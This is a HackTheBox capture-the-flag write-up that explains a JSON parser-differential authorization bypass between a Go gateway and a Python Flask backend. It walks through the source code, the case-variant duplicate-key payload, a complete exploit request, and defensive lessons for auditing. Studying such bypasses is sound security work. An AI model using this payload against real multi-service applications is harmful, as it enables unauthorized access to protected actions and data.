---
tags:
  - "HackTheBox"
  - "Web-Challenge"
  - "Go"
  - "Python"
  - "Web"
  - "Easy"
---

# HackTheBox — Space Explorer

> **Difficulty:** Easy\
> **Category:** Web\
> **Technique:** JSON Parser Differential / Authentication Bypass\
> **Stack:** Go + Python/Flask

---

### [Parser Differentials](https://hacktricks.wiki/en/pentesting-web/json-xml-yaml-hacking.html#parser-differentials) Explotation

The goal is to bypass authorization by exploiting how different parsers interpret the same payload. Real cases include CouchDB’s duplicate-key administrator bypass, a Zoom XMPP/XML parser differential, and GitLab’s 2025 SAML parser-confusion bypass.[\[5\]\[6\]\[7\]](https://hacktricks.wiki/en/pentesting-web/json-xml-yaml-hacking.html#references)

**1. Duplicate Fields (legacy&#x20;**`encoding/json`**&#x20;v1 semantics):** Go’s `encoding/json` processes duplicate members in order; later scalar values replace earlier ones, while maps and structs can merge values.[\[4\]](https://hacktricks.wiki/en/pentesting-web/json-xml-yaml-hacking.html#references)

```
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction

```

Other parsers or configurations may reject duplicates, preserve the first value, or also preserve the last value. This becomes exploitable when security checks and business logic disagree about the same object.[\[1\]\[4\]](https://hacktricks.wiki/en/pentesting-web/json-xml-yaml-hacking.html#references)

**2. Case-insensitive matching (legacy&#x20;**`encoding/json`**&#x20;v1 semantics):** Go’s legacy decoder matches JSON names to struct fields case-insensitively:

```
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field

```

Unicode simple-fold equivalents can also match. For example, the long-s character can collide with ASCII `s`, and the Kelvin sign can collide with ASCII `K` in field names:[\[1\]](https://hacktricks.wiki/en/pentesting-web/json-xml-yaml-hacking.html#references)

```
json.Unmarshal([]byte(`{"Uſername":"admin"}`), &user)
// may match the exported field Username

json.Unmarshal([]byte(`{"Key":"value"}`), &record)
// may match the exported field Key

```

**3. Cross-service mismatch:** Imagine:

- Proxy written in Go
- AuthZ service written in Python

Attacker sends:

```
{
  "action": "UserAction",
  "AcTiOn": "AdminAction"
}

```

- Python sees `UserAction`, allows it
- Go sees `AdminAction`, executes it

## 1. Reconnaissance

The application exposes a web interface called **Cosmic Explorer**.

The main endpoint is:

```http
POST /execute

```

The application expects a JSON body containing an `action` parameter.

A normal request looks like:

```http
POST /execute HTTP/1.1
Content-Type: application/json

{
    "action": "getcosmic"
}

```

The server returns information about a random cosmic anomaly.

---

## 2. Source Code Analysis

The application consists of **two different backend services**:

```text
          Client
             │
             ▼
       Go application
          :8080
             │
             │ getcosmic
             ▼
       Python Flask
          :8081

```

The Go service acts as a gateway/proxy.

### Go — Sender

The request is parsed into:

```go
type RequestData struct {
    Action string `json:"action"`
}

```

The application then checks the requested action:

```go
switch requestData.Action {
case "getcosmic":
    resp, err := http.Post(
        "http://localhost:8081/execute",
        "application/json",
        bytes.NewBuffer(body),
    )

case "getSecureCode":
    w.Write([]byte("Access denied: Invalid security clearance"))

default:
    http.Error(w, "Invalid command", http.StatusBadRequest)
}

```

At first glance, this appears secure.

The dangerous action:

```text
getSecureCode

```

is explicitly blocked.

However, there is an important detail:

```go
bytes.NewBuffer(body)

```

The Go service forwards the **original HTTP request body** to the Python service.

It does not forward the already-parsed `RequestData` structure.

This creates an opportunity for the two services to interpret the same JSON differently.

---

# 3. Python Backend

The second service is written using Flask.

Its `/execute` endpoint contains:

```python
data = request.get_json()

if 'action' not in data:
    return jsonify({"error": "No command received"}), 400

if data['action'] == "getcosmic":
    anomaly = random.choice(COSMIC_ANOMALIES)
    return jsonify(anomaly)

elif data['action'] == "getSecureCode":
    return jsonify({
        "flag": os.getenv("FLAG", "HTB{flag_not_set}"),
        "name": "Captain's Log",
        "src": "https://images.unsplash.com/photo-1534447677768-be436bb09401?w=600"
    })

```

The important part is:

```python
elif data['action'] == "getSecureCode":

```

If we can make Python see:

```text
action = getSecureCode

```

while making Go see:

```text
Action = getcosmic

```

we can bypass the authorization check.

---

# 4. The Interesting Clue

The challenge uses two different languages to process the same JSON:

```text
Go
 │
 │ JSON
 ▼
Python

```

This immediately suggests investigating **parser differentials**.

A parser differential occurs when two components process the same input but interpret it differently.

This is especially interesting when one parser performs a security check and another parser performs the actual operation.

---

# 5. JSON Parser Differentials

A useful reference for this technique is HackTricks:

[HackTricks — JSON, XML & YAML Hacking](https://hacktricks.wiki/en/pentesting-web/json-xml-yaml-hacking.html)

The relevant section is:

[HackTricks — Parser Differentials](https://hacktricks.wiki/en/pentesting-web/json-xml-yaml-hacking.html#parser-differentials)

The core idea is to exploit differences between parsers so that:

```text
Security check → sees one thing

Backend logic   → sees another thing

```

HackTricks discusses several examples.

---

## 5.1 Duplicate JSON fields

One technique involves duplicate JSON members:

```json
{
    "action": "UserAction",
    "action": "AdminAction"
}

```

Depending on the parser and implementation, duplicate fields can be:

- rejected
- interpreted using the first value
- interpreted using the last value
- merged in some cases

For example, with Go's legacy `encoding/json` semantics:

```go
json.Unmarshal(
    []byte(`{"action":"UserAction", "action":"AdminAction"}`),
    &req,
)

fmt.Println(req.Action)

```

can result in:

```text
AdminAction

```

The important point is that **duplicate fields can produce parser-dependent behaviour**.

---

# 6. Case-Insensitive JSON Field Matching

The technique that is particularly relevant to this challenge is **case-insensitive field matching**.

Go's legacy `encoding/json` decoder matches JSON names to struct fields case-insensitively.

For example:

```json
{
    "AcTiOn": "AdminAction"
}

```

can match:

```go
type RequestData struct {
    Action string `json:"action"`
}

```

Therefore:

```text
action
Action
ACTION
AcTiOn

```

can potentially refer to the same Go struct field.

Python dictionaries behave differently.

Python treats:

```python
"action"

```

and:

```python
"Action"

```

as two different keys.

This difference is exactly what we need.

---

# 7. Finding the Differential

We need to construct JSON that produces:

```text
             Go             Python

action       getcosmic      getSecureCode

```

The key is that Go should consider:

```json
"action"

```

and:

```json
"Action"

```

the same field.

Python, however, should consider them different fields.

The final payload is:

```json
{
    "action": "getSecureCode",
    "Action": "getcosmic"
}

```

The order is extremely important.

---

# 8. What Go Sees

Go receives:

```json
{
    "action": "getSecureCode",
    "Action": "getcosmic"
}

```

Because Go matches JSON field names case-insensitively, both:

```text
action
Action

```

match:

```go
Action string `json:"action"`

```

The later matching value wins.

Therefore Go ends up with:

```go
requestData.Action = "getcosmic"

```

The authorization check becomes:

```go
switch requestData.Action {
case "getcosmic":

```

which succeeds.

The request is therefore allowed.

---

# 9. The Original Body Is Forwarded

This is the second half of the vulnerability.

Go does not construct a new JSON object from:

```go
requestData

```

Instead it forwards:

```go
bytes.NewBuffer(body)

```

Therefore Python receives the exact original JSON:

```json
{
    "action": "getSecureCode",
    "Action": "getcosmic"
}

```

This is crucial.

If Go had rebuilt the JSON after parsing it, the attack would not work.

---

# 10. What Python Sees

Python parses the JSON into a dictionary.

Unlike Go's field matching, Python dictionary keys are case-sensitive.

Therefore Python sees two separate keys:

```python
data["action"] = "getSecureCode"
data["Action"] = "getcosmic"

```

The application checks:

```python
data['action']

```

Notice the lowercase `a`.

Therefore:

```python
data['action'] == "getSecureCode"

```

is true.

Python enters:

```python
elif data['action'] == "getSecureCode":

```

and returns:

```python
{
    "flag": os.getenv("FLAG"),
    "name": "Captain's Log",
    "src": "..."
}

```

The flag is returned.

---

# 11. The Complete Exploit Flow

The entire vulnerability can be represented as:

```text
                         JSON
                          │
                          ▼
        ┌─────────────────────────────────┐
        │                                 │
        │ "action": "getSecureCode"       │
        │ "Action": "getcosmic"           │
        │                                 │
        └────────────────┬────────────────┘
                         │
                         ▼
                  ┌─────────────┐
                  │     Go      │
                  └──────┬──────┘
                         │
              case-insensitive
                    matching
                         │
                         ▼
              Action = getcosmic
                         │
                         ▼
                     ALLOWED
                         │
                         │ original body
                         ▼
                  ┌─────────────┐
                  │   Python    │
                  └──────┬──────┘
                         │
                  case-sensitive
                    dictionary
                         │
                         ▼
             action = getSecureCode
                         │
                         ▼
                    FLAG LEAKED

```

The same HTTP request therefore has two different interpretations:

```text
Go     → getcosmic
Python → getSecureCode

```

This is the **parser differential**.

---

# 12. Exploit Request

The final request is:

```http
POST /execute HTTP/1.1
Host: TARGET
Content-Type: application/json

{
    "action": "getSecureCode",
    "Action": "getcosmic"
}

```

The important detail is the capitalization:

```text
action
Action

```

and the order:

```text
"action": "getSecureCode"
"Action": "getcosmic"

```

---

# 13. Why the Reverse Order Doesn't Work

Consider:

```json
{
    "action": "getcosmic",
    "Action": "getSecureCode"
}

```

Go treats both keys as the same field.

The last matching value is:

```text
getSecureCode

```

Therefore:

```go
requestData.Action == "getSecureCode"

```

The Go service reaches:

```go
case "getSecureCode":

```

and returns:

```text
Access denied: Invalid security clearance

```

The request never reaches the vulnerable Python logic.

So the correct order is:

```json
{
    "action": "getSecureCode",
    "Action": "getcosmic"
}

```

not:

```json
{
    "action": "getcosmic",
    "Action": "getSecureCode"
}

```

---

# 14. Why This Vulnerability Exists

The fundamental design problem is that the application has two independent parsers processing the same untrusted input.

The architecture is effectively:

```text
Client
  │
  ▼
Go Parser
  │
  ├── Authorization
  │
  ▼
Original JSON
  │
  ▼
Python Parser
  │
  └── Business Logic

```

The authorization decision is therefore made using one interpretation of the JSON, while the actual operation is performed using another interpretation.

This creates a trust boundary problem.

---

# 15. General Lesson

When auditing applications with multiple services, pay close attention to:

- Go → Python
- Go → Java
- Node.js → Python
- PHP → Node.js
- reverse proxy → backend
- API gateway → microservice
- WAF → application

Whenever multiple components parse the same attacker-controlled data, ask:

```text
Do both components interpret this input identically?

```

Especially investigate:

```text
Duplicate keys
Case sensitivity
Unicode normalization
Type confusion
Null values
Arrays vs objects
Number parsing
Boolean parsing
Prototype/object behaviour

```

A security control is only as strong as the consistency between the component performing the validation and the component performing the action.

---

# 16. Key Takeaway

The vulnerability was not simply:

> "The `getSecureCode` endpoint is accessible."

The endpoint was correctly protected by the Go service.

The actual vulnerability was:

> **Go and Python disagree about the meaning of the same JSON document.**

Go performs case-insensitive matching:

```text
action == Action

```

Python performs case-sensitive dictionary lookup:

```text
"action" != "Action"

```

By exploiting that difference:

```json
{
    "action": "getSecureCode",
    "Action": "getcosmic"
}

```

we make:

```text
Go     → getcosmic       → authorization bypass
Python → getSecureCode   → flag

```

This is a textbook example of a **JSON Parser Differential**.

---

## References

- [HackTricks — JSON, XML & YAML Hacking](https://hacktricks.wiki/en/pentesting-web/json-xml-yaml-hacking.html)
- [HackTricks — Parser Differentials](https://hacktricks.wiki/en/pentesting-web/json-xml-yaml-hacking.html#parser-differentials)
- [HTB Space Explorer Writeup — Raviaravindhan Official](https://medium.com/@raviaravindhan.official/htb-space-explorer-writeup-07fb8945aa6a)

---

## TL;DR

```json
{
    "action": "getSecureCode",
    "Action": "getcosmic"
}

```

```text
             Go                 Python

        action == Action       action != Action
              │                      │
              ▼                      ▼
        getcosmic              getSecureCode
              │                      │
              ▼                      ▼
           ALLOW                    FLAG

```

**One JSON document. Two parsers. Two interpretations. Authentication bypass.**
